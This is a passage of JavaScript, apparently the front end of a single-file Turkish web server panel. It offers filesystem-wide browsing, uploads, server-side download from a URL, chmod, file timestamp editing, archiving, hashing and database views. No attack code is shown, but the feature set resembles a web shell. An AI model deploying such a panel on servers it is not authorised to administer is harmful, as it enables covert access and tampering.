  audio: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
  edit: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.12 2.12 0 0 1 3 3L12 15l-4 1 1-4z"/></svg>',
  download: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
  rename: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 20h4L18.5 9.5a2.12 2.12 0 0 0-3-3L5 17z"/></svg>',
  trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>',
  unzip: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
  key: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6M15.5 7.5l3 3L21 8l-3-3"/></svg>',
  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>',
  x: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  alert: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
  upload: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
  table: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="3" y1="15" x2="21" y2="15"/><line x1="9" y1="3" x2="9" y2="21"/></svg>',
  plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>',
  clock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>',
  info: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
  copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
  more: '<svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"/><circle cx="12" cy="12" r="1.8"/><circle cx="12" cy="19" r="1.8"/></svg>',
  scissors: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><line x1="20" y1="4" x2="8.12" y2="15.88"/><line x1="14.47" y1="14.48" x2="20" y2="20"/><line x1="8.12" y1="8.12" x2="12" y2="12"/></svg>',
  clipboard: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/></svg>',
  server: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
  eye: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
  eyeOff: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a18.5 18.5 0 0 1 5.06-5.94M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>',
  refresh: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>',
  move: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="5 9 2 12 5 15"/><polyline points="9 5 12 2 15 5"/><polyline points="15 19 12 22 9 19"/><polyline points="19 9 22 12 19 15"/><line x1="2" y1="12" x2="22" y2="12"/><line x1="12" y1="2" x2="12" y2="22"/></svg>',
};

function esc(s){ return (s ?? '').toString().replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
function joinPath(dir, name){ return dir === '/' ? '/' + name : dir + '/' + name; }
function toast(msg, type='success'){
  const wrap = document.getElementById('toastWrap');
  const el = document.createElement('div');
  el.className = 'toast ' + type;
  el.innerHTML = (type==='success'?ICONS.check:ICONS.alert) + '<span>' + esc(msg) + '</span>';
  wrap.appendChild(el);
  setTimeout(()=>{ el.style.opacity='0'; el.style.transition='.3s'; setTimeout(()=>el.remove(),300); }, 3200);
}
async function api(action, data={}, isForm=false){
  const needsConnId = action.indexOf('db_') === 0 && action !== 'db_connect' && action !== 'db_status';
  if (needsConnId){
    if (isForm){ if (!data.has('connId')) data.append('connId', activeConnId || ''); }
    else { if (!('connId' in data)) data.connId = activeConnId || ''; }
  }
  let opts;
  if (isForm){
    data.append('action', action);
    data.append('csrf', CSRF);
    opts = { method:'POST', body:data };
  } else {
    const fd = new URLSearchParams();
    fd.append('action', action);
    fd.append('csrf', CSRF);
    for (const k in data) fd.append(k, typeof data[k]==='object' ? JSON.stringify(data[k]) : data[k]);
    opts = { method:'POST', body:fd };
  }
  const res = await fetch('', opts);
  const json = await res.json();
  if (!json.ok) throw new Error(json.error || 'Bilinmeyen hata');
  return json;
}

function openModal({title, bodyHtml, wide=false, xwide=false, footHtml=''}){
  closeModal();
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.id = 'activeModal';
  overlay.innerHTML = `
    <div class="modal ${wide?'wide':''} ${xwide?'xwide':''}">
      <div class="modal-head">
        <div class="modal-title">${esc(title)}</div>
        <button class="modal-close" onclick="closeModal()">${ICONS.x}</button>
      </div>
      <div class="modal-body">${bodyHtml}</div>
      ${footHtml ? `<div class="modal-foot">${footHtml}</div>` : ''}
    </div>`;
  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
  document.body.appendChild(overlay);
  return overlay;
}
function closeModal(){ document.getElementById('activeModal')?.remove(); document.getElementById('cmFullscreenExit')?.remove(); activeEditor = null; }
function closeRowMenu(){ document.getElementById('activeRowMenu')?.remove(); }

document.querySelectorAll('.nav-item').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
    document.querySelectorAll('.view-container').forEach(v => v.classList.add('hidden'));
    document.getElementById('view-' + el.dataset.view).classList.remove('hidden');
    if (el.dataset.view === 'database' && !dbInited) initDb();
    if (el.dataset.view === 'server') loadServerInfo();
    if (el.dataset.view === 'extras') loadExtrasView();
    closeSidebarMobile();
  });
});

function openSidebarMobile(){
  document.getElementById('sidebar').classList.add('open');
  if (!document.getElementById('sidebarBackdrop')){
    const bd = document.createElement('div');
    bd.className = 'sidebar-backdrop';
    bd.id = 'sidebarBackdrop';
    bd.addEventListener('click', closeSidebarMobile);
    document.body.appendChild(bd);
  }
}
function closeSidebarMobile(){
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarBackdrop')?.remove();
}
document.getElementById('hamburgerBtn').addEventListener('click', () => {
  document.getElementById('sidebar').classList.contains('open') ? closeSidebarMobile() : openSidebarMobile();
});

function applyTheme(t){
  if (t === 'light') document.documentElement.setAttribute('data-theme', 'light');
  else document.documentElement.removeAttribute('data-theme');
  document.getElementById('themeIconMoon').classList.toggle('hidden', t === 'light');
  document.getElementById('themeIconSun').classList.toggle('hidden', t !== 'light');
  document.getElementById('themeLabel').textContent = t === 'light' ? 'Açık Mod' : 'Koyu Mod';
  if (typeof activeEditor !== 'undefined' && activeEditor) {
    activeEditor.setOption('theme', t === 'light' ? 'default' : 'material-darker');
  }
}
document.getElementById('themeToggle').addEventListener('click', () => {
  const cur = document.documentElement.getAttribute('data-theme') === 'light' ? 'light' : 'dark';
  const next = cur === 'light' ? 'dark' : 'light';
  applyTheme(next);
  try{ localStorage.setItem('poe_panel_theme', next); }catch(e){}
});
(function initTheme(){
  let saved = 'dark';
  try{ saved = localStorage.getItem('poe_panel_theme') || 'dark'; }catch(e){}
  applyTheme(saved);
})();

document.addEventListener('keydown', e => { if (e.key === 'Escape'){ closeModal(); closeRowMenu(); closeHashPanel(); } });

function openHashPanel(){
  document.getElementById('hashPanel').classList.add('open');
  document.getElementById('hashPanelBackdrop').classList.remove('hidden');
  document.getElementById('hashInput').focus();
}
function closeHashPanel(){
  document.getElementById('hashPanel').classList.remove('open');
  document.getElementById('hashPanelBackdrop').classList.add('hidden');
}
document.getElementById('btnHashTool').addEventListener('click', openHashPanel);
document.getElementById('hashPanelClose').addEventListener('click', closeHashPanel);
document.getElementById('hashPanelBackdrop').addEventListener('click', closeHashPanel);

const HASH_LABELS = [
  ['md5', 'MD5'], ['sha1', 'SHA1'], ['md5_sha1', 'MD5 (SHA1)'], ['sha1_md5', 'SHA1 (MD5)'],
  ['sha256', 'SHA256'], ['sha512', 'SHA512'], ['sha3_256', 'SHA3-256'], ['sha3_512', 'SHA3-512'],
  ['ripemd160', 'RIPEMD160'], ['crc32b', 'CRC32'], ['bcrypt', 'BCRYPT (Cost 10)'],
];
let hashTimer;
document.getElementById('hashInput').addEventListener('input', (e) => {
  clearTimeout(hashTimer);
  const text = e.target.value;
  const box = document.getElementById('hashResults');
  if (text === ''){ box.innerHTML = ''; return; }
  hashTimer = setTimeout(async () => {
    try{
      const res = await api('hash_calc', { text });
      box.innerHTML = HASH_LABELS.map(([key, label]) => {
        const val = res[key];
        if (val === null || val === undefined) return '';
        return `
          <div class="hash-item">
            <div class="hash-label"><span>${label}</span><button class="hash-copy-btn" data-hashcopy="${esc(val)}">${ICONS.copy}</button></div>
            <div class="hash-value" data-hashcopy="${esc(val)}">${esc(val)}</div>
          </div>`;
      }).join('');
      box.querySelectorAll('[data-hashcopy]').forEach(el => {
        el.addEventListener('click', async () => {
          try{ await navigator.clipboard.writeText(el.dataset.hashcopy); toast('Kopyalandı'); }
          catch(err){ toast('Kopyalanamadı', 'error'); }
        });
      });
    }catch(err){ toast(err.message, 'error'); }
  }, 250);
});

let currentPath = '/';
let currentItems = [];
let selected = new Set();
let clipboard = null;
let navHistory = [];
let navIndex = -1;

function currentPathRel(){ return currentPath; }

async function loadFiles(path=''){
  try{
    const res = await api('fm_list', { path });
    currentPath = res.path;
    currentItems = res.items;
    selected.clear();
    renderCrumbs(res.relPath);
    renderFileList();
  }catch(e){ toast(e.message, 'error'); }
}

async function goToPath(path){
  await loadFiles(path);
  if (navHistory[navIndex] !== currentPath){
    navHistory = navHistory.slice(0, navIndex + 1);
    navHistory.push(currentPath);
    navIndex = navHistory.length - 1;
  }
  updateNavButtons();
}
async function navBack(){
  if (navIndex <= 0) return;
  navIndex--;
  await loadFiles(navHistory[navIndex]);
  updateNavButtons();
}
async function navForward(){
  if (navIndex >= navHistory.length - 1) return;
  navIndex++;
  await loadFiles(navHistory[navIndex]);
  updateNavButtons();
}
function updateNavButtons(){
  document.getElementById('btnBack').disabled = navIndex <= 0;
  document.getElementById('btnForward').disabled = navIndex >= navHistory.length - 1;
}
document.getElementById('btnBack').addEventListener('click', navBack);
document.getElementById('btnForward').addEventListener('click', navForward);
document.getElementById('btnPanelHome').addEventListener('click', () => goToPath(PANEL_START_DIR));

function renderCrumbs(relPath){
  const parts = relPath ? relPath.split('/').filter(Boolean) : [];
  let html = `<span class="crumb" data-path="/" title="Dosya sistemi kökü">${iconSpan('folder')} /</span>`;
  let acc = '';
  parts.forEach(p => {
    acc += '/' + p;
    html += `<span class="crumb-sep">/</span><span class="crumb" data-path="${esc(acc)}">${esc(p)}</span>`;
  });
  const crumbsEl = document.getElementById('crumbs');
  crumbsEl.innerHTML = html;
  crumbsEl.querySelectorAll('.crumb').forEach(c => c.addEventListener('click', () => goToPath(c.dataset.path)));
  document.getElementById('btnUp').disabled = (currentPath === '/');
  document.getElementById('pathJumpInput').value = currentPath;
}
function iconSpan(key){ return `<span style="display:inline-flex;width:14px;height:14px;vertical-align:-2px;">${ICONS[key]||''}</span>`; }

function getDisplayItems(){
  let items = [...currentItems];
  if (!document.getElementById('toggleHidden')?.checked) items = items.filter(i => !i.name.startsWith('.'));
  const filterType = document.getElementById('filterTypeSelect')?.value || '';
  if (filterType) items = items.filter(i => i.isDir || i.icon === filterType);
  const filterExtRaw = (document.getElementById('filterExtInput')?.value || '').trim();
  if (filterExtRaw){
    const exts = filterExtRaw.split(',').map(s => s.trim().replace(/^\./, '').toLowerCase()).filter(Boolean);
    if (exts.length) items = items.filter(i => {
      if (i.isDir) return true;
      const parts = i.name.split('.');
      const ext = parts.length > 1 ? parts.pop().toLowerCase() : '';
      return exts.includes(ext);
    });
  }
  const sortBy = document.getElementById('sortSelect')?.value || 'name';
  items.sort((a,b) => {
    if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
    if (sortBy === 'size') return (b.size||0) - (a.size||0);
    if (sortBy === 'date') return new Date(b.modified) - new Date(a.modified);
    return a.name.localeCompare(b.name, 'tr');
  });
  return items;
}

function renderFileList(){
  const tbody = document.getElementById('fileList');
  const empty = document.getElementById('emptyState');
  const items = getDisplayItems();
  if (!items.length){
    tbody.innerHTML = '';
    empty.classList.remove('hidden');
  } else {
    empty.classList.add('hidden');
    tbody.innerHTML = items.map(it => `
      <tr data-name="${esc(it.name)}" class="${it.isSelf ? 'self-file-row' : ''}">
        <td><input type="checkbox" class="checkbox row-check" data-name="${esc(it.name)}"></td>
        <td>
          <div class="file-row-name ${it.isSelf ? 'self-file-name' : ''}" data-open="${esc(it.name)}" data-isdir="${it.isDir?1:0}">
            <span class="icon-${it.icon}">${ICONS[it.icon] || ICONS.file}</span>
            <span>${esc(it.name)}</span>
            ${it.isLink ? '<span class="link-badge">link</span>' : ''}
            ${it.isSelf ? '<span class="self-badge" title="Bu, şu an çalıştırdığınız panel dosyası — dikkatli olun!">PANEL</span>' : ''}
          </div>
        </td>
        <td class="muted">${it.isDir ? '—' : esc(it.sizeH)}</td>
        <td class="muted ${it.created !== it.modified ? 'date-diff' : ''}" title="Oluşturulma">${esc(it.created)}</td>
        <td class="muted ${it.created !== it.modified ? 'date-diff' : ''}" title="Değiştirilme">${esc(it.modified)}</td>
        <td class="muted mono">${esc(it.perms)}</td>
        <td>
          <div class="row-actions">
            ${!it.isDir ? `<button class="icon-btn" data-act="download" data-name="${esc(it.name)}" title="İndir">${ICONS.download}</button>` : ''}
            <button class="icon-btn" data-act="more" data-name="${esc(it.name)}" title="Diğer İşlemler">${ICONS.more}</button>
          </div>
        </td>
      </tr>
    `).join('');
  }
  bindFileRowEvents();
  updateSelectInfo();
}

function bindFileRowEvents(){
  document.querySelectorAll('.file-row-name').forEach(el => {
    el.addEventListener('click', () => {
      const name = el.dataset.open;
      const isDir = el.dataset.isdir === '1';
      if (isDir){ goToPath(joinPath(currentPath, name)); return; }
      const item = currentItems.find(i => i.name === name);
      if (item && item.icon === 'image') { previewImage(name); return; }
      if (item && item.icon === 'pdf') { previewPdf(name); return; }
      if (item && item.icon === 'video') { previewVideo(name); return; }
      if (item && item.icon === 'audio') { previewAudio(name); return; }
      if (item && item.icon === 'archive') { showInfo(name); return; }
      openEditor(name);
    });
  });
  document.querySelectorAll('.row-check').forEach(cb => {
    cb.addEventListener('change', () => {
      if (cb.checked) selected.add(cb.dataset.name); else selected.delete(cb.dataset.name);
      updateSelectInfo();
    });
  });
  document.querySelectorAll('[data-act]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const act = btn.dataset.act, name = btn.dataset.name;
      if (act === 'download') downloadFile(name);
      if (act === 'more') { const r = btn.getBoundingClientRect(); showMenuAt(r.right, r.bottom + 4, buildItemMenuOpts(name), true); }
    });
  });
  document.querySelectorAll('#fileList tr').forEach(tr => {
    tr.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const name = tr.dataset.name;
      if (!name) return;
      showMenuAt(e.clientX, e.clientY, buildItemMenuOpts(name));
    });
  });
  const tableWrap = document.querySelector('#view-files .table-wrap');
  if (tableWrap && !tableWrap.dataset.ctxBound){
    tableWrap.dataset.ctxBound = '1';
    tableWrap.addEventListener('contextmenu', (e) => {
      if (e.target.closest('tr') || e.target.closest('th')) return;
      e.preventDefault();
      e.stopPropagation();
      showMenuAt(e.clientX, e.clientY, buildFolderMenuOpts());
    });
  }
}

function buildItemMenuOpts(name){
  const item = currentItems.find(i => i.name === name);
  if (!item) return [];
  const opts = [];
  opts.push({icon:'scissors', label:'Kes', act:()=>cutItems([name])});
  opts.push({icon:'clipboard', label:'Kopyala', act:()=>copyItemsToClipboard([name])});
  opts.push({icon:'move', label:'Taşı (Konum Seç)', act:()=>openMoveCopyModal([name], 'move')});
  opts.push({icon:'copy', label:'Kopyala (Konum Seç)', act:()=>openMoveCopyModal([name], 'copy')});
  if (!item.isDir) opts.push({icon:'download', label:'İndir', act:()=>downloadFile(name)});
  if (!item.isDir) opts.push({icon:'edit', label:'Düzenle', act:()=>openEditor(name)});
  opts.push({icon:'plus', label:'Yeni Klasör', act:()=>document.getElementById('btnMkdir').click()});
  opts.push({icon:'file', label:'Yeni Dosya', act:()=>document.getElementById('btnMkfile').click()});
  opts.push({icon:'rename', label:'Yeniden Adlandır', act:()=>renameItem(name)});
  opts.push({icon:'key', label:'İzinler (chmod)', act:()=>chmodItem(name)});
  opts.push({icon:'clock', label:'Tarih Düzenle', act:()=>touchItem(name)});
  opts.push({icon:'info', label:'Özellikler', act:()=>showInfo(name)});
  opts.push({icon:'copy', label:'Çoğalt', act:()=>duplicateItem(name)});
  opts.push({icon:'archive', label:'Ziple İndir', act:()=>zipItemsDownload([name])});
  opts.push({icon:'server', label:'Sunucuya Ziple', act:()=>zipItemsServer([name])});
  if (item.icon === 'archive' && !item.isDir) opts.push({icon:'unzip', label:'Zipten Çıkar', act:()=>unzipFile(name)});
  opts.push({icon:'trash', label:'Sil', act:()=>deleteItems([name]), danger:true});
  return opts;
}

function buildFolderMenuOpts(){
  const opts = [];
  if (clipboard) opts.push({icon:'clipboard', label:'Yapıştır', act:pasteHere});
  opts.push({icon:'plus', label:'Yeni Klasör', act:()=>document.getElementById('btnMkdir').click()});
  opts.push({icon:'file', label:'Yeni Dosya', act:()=>document.getElementById('btnMkfile').click()});
  opts.push({icon:'upload', label:'Dosya Yükle', act:()=>document.getElementById('btnUpload').click()});
  opts.push({icon:'refresh', label:'Yenile', act:()=>loadFiles(currentPath)});
  return opts;
}

function openRowMenu(anchorEl, name){
  const r = anchorEl.getBoundingClientRect();
  showMenuAt(r.right, r.bottom + 4, buildItemMenuOpts(name), true);
}

function showMenuAt(x, y, opts, alignRight){
  closeRowMenu();
  if (!opts.length) return;
  const menu = document.createElement('div');
  menu.className = 'row-menu';
  menu.id = 'activeRowMenu';
  menu.innerHTML = opts.map((o,i) => `<button class="row-menu-item ${o.danger?'danger':''}" data-i="${i}">${ICONS[o.icon]||''}<span>${esc(o.label)}</span></button>`).join('');
  document.body.appendChild(menu);
  const menuRect = menu.getBoundingClientRect();
  let left = alignRight ? x - menuRect.width : x;
  let top = y;
  if (top + menuRect.height > window.innerHeight) top = Math.max(8, window.innerHeight - menuRect.height - 8);
  if (left + menuRect.width > window.innerWidth) left = window.innerWidth - menuRect.width - 8;
  if (left < 8) left = 8;
  if (top < 8) top = 8;
  menu.style.top = top + 'px';
  menu.style.left = left + 'px';
  menu.querySelectorAll('.row-menu-item').forEach((b,i) => b.addEventListener('click', (e) => { e.stopPropagation(); opts[i].act(); closeRowMenu(); }));
}
document.addEventListener('click', (e) => { if (!e.target.closest('.row-menu')) closeRowMenu(); });
document.addEventListener('contextmenu', (e) => { if (!e.target.closest('.row-menu')) closeRowMenu(); });

document.getElementById('selectAll').addEventListener('change', (e) => {
  document.querySelectorAll('.row-check').forEach(cb => {
    cb.checked = e.target.checked;
    if (e.target.checked) selected.add(cb.dataset.name); else selected.delete(cb.dataset.name);
  });
  updateSelectInfo();
});
function updateSelectInfo(){
  const box = document.getElementById('selectInfo');
  if (selected.size > 0){
    box.classList.remove('hidden');
    document.getElementById('selectCount').textContent = selected.size + ' öğe seçildi';
  } else box.classList.add('hidden');
}

document.getElementById('btnRefresh').addEventListener('click', () => loadFiles(currentPath));
document.getElementById('btnUp').addEventListener('click', () => {
  if (currentPath === '/') return;
  const parts = currentPath.split('/').filter(Boolean);
  parts.pop();
  goToPath('/' + parts.join('/'));
});
document.getElementById('pathJumpGo').addEventListener('click', jumpToPath);
document.getElementById('pathJumpInput').addEventListener('keydown', e => { if (e.key === 'Enter') jumpToPath(); });
function jumpToPath(){
  const v = document.getElementById('pathJumpInput').value.trim();
  if (v) goToPath(v);
}
document.getElementById('toggleHidden').addEventListener('change', renderFileList);
document.getElementById('sortSelect').addEventListener('change', renderFileList);
document.getElementById('filterTypeSelect').addEventListener('change', renderFileList);
document.getElementById('filterExtInput').addEventListener('input', renderFileList);

document.getElementById('btnMkdir').addEventListener('click', () => {
  openModal({
    title: 'Yeni Klasör',
    bodyHtml: `<div class="field"><label>Klasör Adı</label><input type="text" id="mkName" placeholder="yeni-klasor"></div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="mkGo">Oluştur</button>`
  });
  document.getElementById('mkGo').addEventListener('click', async () => {
    const name = document.getElementById('mkName').value.trim();
    if (!name) return;
    try{ await api('fm_mkdir', { path: currentPath, name }); closeModal(); toast('Klasör oluşturuldu'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
});
document.getElementById('btnMkfile').addEventListener('click', () => {
  openModal({
    title: 'Yeni Dosya',
    bodyHtml: `<div class="field"><label>Dosya Adı</label><input type="text" id="mkFName" placeholder="dosya.txt"></div>`,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="mkFGo">Oluştur</button>`
  });
  document.getElementById('mkFGo').addEventListener('click', async () => {
    const name = document.getElementById('mkFName').value.trim();
    if (!name) return;
    try{ await api('fm_mkfile', { path: currentPath, name }); closeModal(); toast('Dosya oluşturuldu'); loadFiles(currentPath); }
    catch(e){ toast(e.message, 'error'); }
  });
});

document.getElementById('btnUpload').addEventListener('click', () => {
  openModal({
    title: 'Dosya Yükle', wide: true,
    bodyHtml: `
      <div class="dropzone" id="dropzone">
        ${ICONS.upload}
        <div>Dosyaları buraya sürükleyin veya seçmek için tıklayın</div>
        <input type="file" id="fileInput" multiple style="display:none;">
      </div>
      <div id="uploadList" class="hint"></div>
      <div id="uploadResults"></div>
    `,
    footHtml: `<button class="btn" onclick="closeModal()">Kapat</button><button class="btn btn-primary" id="uploadGo">Yükle</button>`
  });
  const dz = document.getElementById('dropzone');
  const fileInput = document.getElementById('fileInput');
  dz.addEventListener('click', () => fileInput.click());
  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
  dz.addEventListener('drop', e => { e.preventDefault(); dz.classList.remove('drag'); fileInput.files = e.dataTransfer.files; showSelectedFiles(); });
  fileInput.addEventListener('change', showSelectedFiles);
  function showSelectedFiles(){ document.getElementById('uploadList').textContent = fileInput.files.length + ' dosya seçildi'; }
  document.getElementById('uploadGo').addEventListener('click', async () => {
    if (!fileInput.files.length) return toast('Dosya seçilmedi', 'error');
    const btn = document.getElementById('uploadGo');
    btn.textContent = 'Yükleniyor...'; btn.disabled = true;
    const fd = new FormData();
    for (const f of fileInput.files) fd.append('files[]', f);
    fd.append('path', currentPath);
    try{
      const res = await api('fm_upload', fd, true);
      btn.textContent = 'Yükle'; btn.disabled = false;
      if (res.uploaded.length){
        document.getElementById('uploadResults').innerHTML = `
          <div class="upload-results">
            ${res.uploaded.map(f => {
              const url = '?stream=preview&path=' + encodeURIComponent(f.path) + '&csrf=' + CSRF;
              return `
                <div class="upload-result-row">
                  <span class="upload-result-name">${esc(f.name)}</span>
                  <span class="upload-result-size">${esc(f.sizeH)}</span>
                  <a class="btn btn-sm" href="${url}" target="_blank" rel="noopener">Aç</a>
                  <button class="btn btn-sm" data-copylink="${url}">Bağlantı Kopyala</button>
                </div>`;
            }).join('')}
          </div>`;
        document.querySelectorAll('[data-copylink]').forEach(b => {
          b.addEventListener('click', async () => {
            try{ await navigator.clipboard.writeText(location.origin + b.dataset.copylink); toast('Bağlantı kopyalandı'); }
            catch(e){ toast('Kopyalanamadı', 'error'); }
          });
        });
        toast(res.uploaded.length + ' dosya yüklendi');
      }
      if (res.errors && res.errors.length) toast(res.errors.join(' · '), 'error');
      document.getElementById('uploadList').textContent = '';
      fileInput.value = '';
      loadFiles(currentPath);
    }catch(e){ btn.textContent = 'Yükle'; btn.disabled = false; toast(e.message, 'error'); }
  });
});

document.getElementById('btnUploadUrl').addEventListener('click', () => {
  openModal({
    title: "URL'den Dosya Yükle",
    bodyHtml: `
      <div class="field"><label>Dosya URL'si</label><input type="text" id="urlVal" placeholder="https://ornek.com/dosya.zip"></div>
      <div class="field"><label>Kaydedilecek Ad (opsiyonel)</label><input type="text" id="urlFilename" placeholder="boş bırakılırsa URL'den alınır"></div>
      <div class="hint">Sunucu bu URL'yi kendisi indirip mevcut klasöre kaydedecektir (wget benzeri).</div>
    `,
    footHtml: `<button class="btn" onclick="closeModal()">İptal</button><button class="btn btn-primary" id="urlGo">İndir ve Kaydet</button>`
  });
  document.getElementById('urlGo').addEventListener('click', async () => {
    const url = document.getElementById('urlVal').value.trim();
    const filename = document.getElementById('urlFilename').value.trim();
    if (!url) return;
    const btn = document.getElementById('urlGo');
    btn.textContent = 'İndiriliyor...'; btn.disabled = true;
    try{
      const res = await api('fm_upload_url', { path: currentPath, url, filename });
      toast('İndirildi: ' + res.filename + ' (' + res.size + ')');
      closeModal();
      loadFiles(currentPath);
    }catch(e){ toast(e.message, 'error'); btn.textContent = 'İndir ve Kaydet'; btn.disabled = false; }
  });
});

function downloadFile(name){
  const rel = joinPath(currentPath, name);
  window.location = '?stream=file&path=' + encodeURIComponent(rel) + '&csrf=' + CSRF;
}
function previewImage(name){
  const rel = joinPath(currentPath, name);
  const url = '?stream=preview&path=' + encodeURIComponent(rel) + '&csrf=' + CSRF;
  openModal({
    title: name, wide: true,
    bodyHtml: `<div style="text-align:center;"><img src="${url}" style="max-width:100%;max-height:60vh;border-radius:8px;"></div>`,
    footHtml: `<a class="btn" href="?stream=file&path=${encodeURIComponent(rel)}&csrf=${CSRF}">İndir</a><button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
  });
}
function previewPdf(name){
  const rel = joinPath(currentPath, name);
  const url = '?stream=preview&path=' + encodeURIComponent(rel) + '&csrf=' + CSRF;
  openModal({
    title: name, xwide: true,
    bodyHtml: `<iframe src="${url}" style="width:100%; height:72vh; border:none; border-radius:8px; background:#fff;"></iframe>`,
    footHtml: `<a class="btn" href="?stream=file&path=${encodeURIComponent(rel)}&csrf=${CSRF}">İndir</a><button class="btn btn-primary" onclick="closeModal()">Kapat</button>`
  });
}
function previewVideo(name){
  const rel = joinPath(currentPath, name);
  const url = '?stream=preview&path=' + encodeURIComponent(rel) + '&csrf=' + CSRF;
  openModal({
    title: name, wide: true,
    bodyHtml: `<video controls style="width:100%; max-height:65vh; border-radius:8px; background:#000; display:block;" src="${url}"></video>`,
